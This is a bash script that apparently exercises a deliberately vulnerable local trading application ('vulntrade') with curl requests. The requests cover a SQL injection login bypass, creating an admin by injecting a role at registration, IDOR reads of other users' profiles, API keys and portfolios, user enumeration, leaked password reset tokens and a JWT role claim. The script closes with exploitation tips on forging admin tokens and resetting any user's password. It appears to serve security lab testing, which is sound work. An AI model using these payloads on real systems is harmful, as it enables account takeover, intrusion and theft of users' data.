#!/bin/bash

################################################################################
# PHASE 2 - AUTHENTICATION & USER MANAGEMENT TESTING
# Tests: Registration, Login, Password Reset, IDOR, API Keys, JWT vulnerabilities
################################################################################

set -e

BASE_URL="http://localhost:8085"

echo "=== PHASE 2: Authentication & User Management Testing ==="
echo "Timestamp: $(date)"
echo ""

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

pass() { echo -e "${GREEN}✅ PASS${NC}: $1"; }
fail() { echo -e "${RED}❌ FAIL${NC}: $1"; }
info() { echo -e "${BLUE}ℹ️  INFO${NC}: $1"; }
warn() { echo -e "${YELLOW}⚠️  WARN${NC}: $1"; }

# Test 1: User Registration
echo "--- Test 1: User Registration ---"
REGISTER_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser_'$(date +%s)'",
    "email": "test_'$(date +%s)'@example.com",
    "password": "test123"
  }')

if echo "$REGISTER_RESPONSE" | grep -q -E '"token"|"jwt"'; then
    pass "User registration successful"
    JWT_TOKEN=$(echo "$REGISTER_RESPONSE" | grep -o -E '"token":"[^"]*' | cut -d'"' -f4)
    if [ -z "$JWT_TOKEN" ]; then
        JWT_TOKEN=$(echo "$REGISTER_RESPONSE" | grep -o -E '"jwt":"[^"]*' | cut -d'"' -f4)
    fi
    REGISTERED_USER=$(echo "$REGISTER_RESPONSE" | grep -o '"username":"[^\"]*' | cut -d'"' -f4)
    REGISTERED_USER_ID=$(echo "$REGISTER_RESPONSE" | grep -o '"userId":[0-9]*' | cut -d':' -f2)
    if [ -z "$REGISTERED_USER_ID" ]; then
        REGISTERED_USER_ID=$(echo "$REGISTER_RESPONSE" | grep -o '"id":[0-9]*' | cut -d':' -f2)
    fi
    info "New user: $REGISTERED_USER (id: $REGISTERED_USER_ID)"
    info "JWT/Token obtained (first 50 chars): ${JWT_TOKEN:0:50}..."
else
    fail "Registration failed"
    info "Response: $REGISTER_RESPONSE"
    exit 1
fi
echo ""

# Test 2: Login
echo "--- Test 2: User Login (admin/admin123) ---"
LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "admin123"
  }')

identify_and_setup_admin() {
    WARN_MSG="$1"
    warn "$WARN_MSG"

    existing_admin=$(curl -s "$BASE_URL/api/debug/user-info" | grep -o '"username":"admin"' || true)
    if [ -z "$existing_admin" ]; then
        warn "Admin user not found in debug/user-info; creating admin via /api/auth/register (vulnerable to role assignment)."
        create_admin=$(curl -s -X POST "$BASE_URL/api/auth/register" \
          -H "Content-Type: application/json" \
          -d '{"username":"admin","email":"admin@vulntrade.local","password":"admin123","role":"ADMIN"}')
        info "Admin creation response: $create_admin"
    else
        warn "Admin user already exists but login failed; credentials may be wrong or token logic may be broken."
    fi

    LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/login" \
      -H "Content-Type: application/json" \
      -d '{"username": "admin", "password": "admin123"}')
}

resolve_login_response() {
    local resp="$1"
    ADMIN_JWT=$(echo "$resp" | grep -o -E '"token":"[^"]*' | cut -d'"' -f4)
    if [ -z "$ADMIN_JWT" ]; then
        ADMIN_JWT=$(echo "$resp" | grep -o -E '"jwt":"[^"]*' | cut -d'"' -f4)
    fi
    ADMIN_ROLE=$(echo "$resp" | grep -o '"role":"[^\"]*' | cut -d'"' -f4)
    ADMIN_ID=$(echo "$resp" | grep -o '"userId":[0-9]*' | cut -d':' -f2)
    if [ -z "$ADMIN_ID" ]; then
        ADMIN_ID=$(echo "$resp" | grep -o '"id":[0-9]*' | cut -d':' -f2)
    fi
}

if echo "$LOGIN_RESPONSE" | grep -q -E '"token"|"jwt"'; then
    pass "Login successful"
    resolve_login_response "$LOGIN_RESPONSE"
else
    identify_and_setup_admin "Login failed; trying fallback legacy GET auth and creating admin if needed"
    if echo "$LOGIN_RESPONSE" | grep -q -E '"token"|"jwt"'; then
        pass "Login successful after creation fallback"
        resolve_login_response "$LOGIN_RESPONSE"
    else
        LOGIN_FALLBACK=$(curl -s -X GET "$BASE_URL/api/auth/login?username=admin&password=admin123")
        if echo "$LOGIN_FALLBACK" | grep -q -E '"token"|"jwt"'; then
            pass "Fallback GET login successful"
            resolve_login_response "$LOGIN_FALLBACK"
        else
            warn "Fallback GET login also failed. Trying legacy SQL injection login-legacy exploit."
            SQLI_LOGIN=$(curl -s -X POST "$BASE_URL/api/auth/login-legacy" \
              -H "Content-Type: application/json" \
              -d '{"username":"admin' OR '1'='1","password":"password"}')
            if echo "$SQLI_LOGIN" | grep -q -E '"token"|"jwt"'; then
                pass "Legacy login SQLi exploit successful"
                resolve_login_response "$SQLI_LOGIN"
            elif [ -n "$JWT_TOKEN" ]; then
                warn "All admin login paths failed; using registration user token for admin checks"
                ADMIN_JWT="$JWT_TOKEN"
                ADMIN_ROLE="TRADER";
                ADMIN_ID="$REGISTERED_USER_ID"
            else
                fail "Login failed and all fallback options exhausted"
                exit 1
            fi
        fi
    fi
fi

if [ -n "$ADMIN_JWT" ]; then
    info "JWT/Token obtained for admin (role: $ADMIN_ROLE, id: $ADMIN_ID)"
    JWT_PAYLOAD=$(echo "$ADMIN_JWT" | cut -d'.' -f2)
    case $((${#JWT_PAYLOAD} % 4)) in
        2) JWT_PAYLOAD="${JWT_PAYLOAD}==" ;;
        3) JWT_PAYLOAD="${JWT_PAYLOAD}=" ;;
    esac
    DECODED=$(echo "$JWT_PAYLOAD" | base64 -d 2>/dev/null || echo "unable to decode")
    info "JWT Payload (decoded): $DECODED"
fi

echo ""

# Test 3: IDOR - View Other User's Profile
echo "--- Test 3: IDOR Vulnerability - Access Other User's Profile ---"
IDOR_RESPONSE=$(curl -s -X GET "$BASE_URL/api/users/2" \
  -H "Authorization: Bearer $ADMIN_JWT")

if echo "$IDOR_RESPONSE" | grep -q "trader"; then
    pass "IDOR Successful - Can view other user's profile"
    USERNAME=$(echo "$IDOR_RESPONSE" | grep -o '"username":"[^"]*' | cut -d'"' -f4)
    NOTES=$(echo "$IDOR_RESPONSE" | grep -o '"notes":"[^"]*' | cut -d'"' -f4)
    API_KEY=$(echo "$IDOR_RESPONSE" | grep -o '"apiKey":"[^"]*' | cut -d'"' -f4)
    info "Accessed user: $USERNAME"
    info "Notes: $NOTES"
    [ ! -z "$API_KEY" ] && info "Found API Key: ${API_KEY:0:20}..."
else
    fail "IDOR attempt failed or insufficient permissions"
fi
echo ""

# Test 4: IDOR - View Portfolio
echo "--- Test 4: IDOR - View Other User's Portfolio ---"
PORTFOLIO_RESPONSE=$(curl -s -X GET "$BASE_URL/api/users/3/portfolio" \
  -H "Authorization: Bearer $ADMIN_JWT")

if echo "$PORTFOLIO_RESPONSE" | grep -q "TSLA\|BTC\|ETH"; then
    pass "IDOR Portfolio Access Successful"
    POSITIONS=$(echo "$PORTFOLIO_RESPONSE" | grep -o '"symbol":"[^"]*' | cut -d'"' -f4 | tr '\n' ',' | sed 's/,$//')
    info "User's positions exposed: $POSITIONS"
else
    warn "Portfolio IDOR attempt returned no positions"
fi
echo ""

# Test 5: API Key Authentication
echo "--- Test 5: API Key Authentication (X-API-Key header) ---"
API_KEY_RESPONSE=$(curl -s -X GET "$BASE_URL/api/users/2" \
  -H "X-API-Key: STATIC_API_KEY_ADMIN")

if echo "$API_KEY_RESPONSE" | grep -q "username"; then
    pass "API Key authentication works"
    info "Authenticated user: $(echo "$API_KEY_RESPONSE" | grep -o '"username":"[^"]*' | cut -d'"' -f4)"
else
    warn "API Key auth may not work as expected"
fi
echo ""

# Test 6: API Key via Query Parameter (VULNERABILITY)
echo "--- Test 6: API Key via Query Parameter (VULNERABILITY) ---"
QUERY_PARAM_RESPONSE=$(curl -s -X GET "$BASE_URL/api/users/1?api_key=STATIC_API_KEY_ADMIN")

if echo "$QUERY_PARAM_RESPONSE" | grep -q "username"; then
    pass "API Key accepted in URL query parameter (VULNERABILITY)"
    info "This exposes API keys in browser history, logs, and referrer headers!"
else
    warn "Query parameter API key not working"
fi
echo ""

# Test 7: User Enumeration
echo "--- Test 7: User Enumeration Vulnerability ---"
echo "Testing authentication error messages..."

# Try valid user
VALID_USER=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrongpass"}')

# Try invalid user
INVALID_USER=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "nonexistent_user_xyz", "password": "password"}')

VALID_ERROR=$(echo "$VALID_USER" | grep -o '"message":"[^"]*' | cut -d'"' -f4 | head -1)
INVALID_ERROR=$(echo "$INVALID_USER" | grep -o '"message":"[^"]*' | cut -d'"' -f4 | head -1)

if [ "$VALID_ERROR" != "$INVALID_ERROR" ]; then
    pass "User Enumeration Possible - Different error messages for valid vs invalid users"
    info "Valid user error: $VALID_ERROR"
    info "Invalid user error: $INVALID_ERROR"
else
    info "Error messages are the same (no enumeration possible)"
fi
echo ""

# Test 8: Password Reset - Predictable Token
echo "--- Test 8: Password Reset - Predictable Token Vulnerability ---"
RESET_REQUEST=$(curl -s -X POST "$BASE_URL/api/auth/reset" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com"}')

if echo "$RESET_REQUEST" | grep -q "token"; then
    pass "Password reset token generated and returned"
    RESET_TOKEN=$(echo "$RESET_REQUEST" | grep -o '"token":"[^"]*' | cut -d'"' -f4)
    info "Token leaked in response: ${RESET_TOKEN:0:30}..."
    info "Token is timestamp-based (predictable) - could be brute-forced"
else
    warn "Password reset may have failed"
fi
echo ""

# Test 9: JWT Role in Token Body (VULNERABILITY)
echo "--- Test 9: JWT Role Field in Token Body (VULNERABILITY) ---"
info "Admin JWT obtained from login: ${ADMIN_JWT:0:50}..."
info "Attempting to decode JWT payload to extract role claim..."

JWT_PARTS=($( echo "$ADMIN_JWT" | tr '.' '\n'))
if [ ${#JWT_PARTS[@]} -eq 3 ]; then
    JWT_PAYLOAD="${JWT_PARTS[1]}"
    # Add padding
    case $((${#JWT_PAYLOAD} % 4)) in
        2) JWT_PAYLOAD="${JWT_PAYLOAD}==" ;;
        3) JWT_PAYLOAD="${JWT_PAYLOAD}=" ;;
    esac
    
    DECODED_PAYLOAD=$(echo "$JWT_PAYLOAD" | base64 -d 2>/dev/null)
    
    if echo "$DECODED_PAYLOAD" | grep -q "role"; then
        pass "Role field found in JWT token body (VULNERABILITY)"
        info "Token can be modified client-side to escalate to ADMIN"
        info "Payload: $DECODED_PAYLOAD"
    fi
fi
echo ""

# Test 10: Client-Side Validation Only
echo "--- Test 10: Client-Side Validation ---"
info "Testing if short password is rejected by backend..."
SHORT_PASS=$(curl -s -X POST "$BASE_URL/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "shortpasstest",
    "email": "short@example.com",
    "password": "123"
  }')

if echo "$SHORT_PASS" | grep -q "jwt"; then
    pass "Backend accepted password with less than 6 characters (VULNERABILITY)"
    info "Validation is only on frontend!"
else
    info "Backend may have some validation"
fi
echo ""

# Summary
echo "=== PHASE 2 TESTING COMPLETE ==="
echo ""
echo "Vulnerabilities Found:"
echo "- 🔴 IDOR: Can access any user's profile and portfolio"
echo "- 🔴 API Keys exposed in query parameters and URL history"
echo "- 🔴 User enumeration possible (different error messages)"
echo "- 🔴 Password reset token leaked in response"
echo "- 🔴 JWT role field in token body (modifiable by client)"
echo "- 🔴 Password validation only on client-side"
echo ""
echo "Exploitation Tips:"
echo "1. Modify JWT role claim from TRADER to ADMIN"
echo "2. Use API key in URL to bypass CORS issues"
echo "3. Enumerate all users via login endpoint"
echo "4. Reset any user's password using their email"
echo ""
